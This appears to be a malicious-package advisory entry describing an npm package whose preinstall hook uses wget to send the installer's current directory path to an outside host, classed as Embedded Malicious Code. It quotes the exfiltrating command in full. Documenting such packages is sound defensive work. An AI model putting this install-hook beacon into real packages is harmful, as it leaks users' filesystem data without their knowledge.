summary: preinstall hook exfiltrates installer working directory via wget
details: package.json declares a preinstall lifecycle script that runs `wget --quiet "http://google.com/?user=$(pwd)"` on `npm install`. The installer's current working directory is captured via shell command substitution and transmitted as a query-string parameter in an outbound HTTP request. The package ships no library code or dependencies; the exfiltration beacon is the package's only effect on install. The destination (google.com) returns a benign response, but the request carries installer-side filesystem path data off-host over cleartext HTTP, consistent with dependency-confusion reconnaissance beacons.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
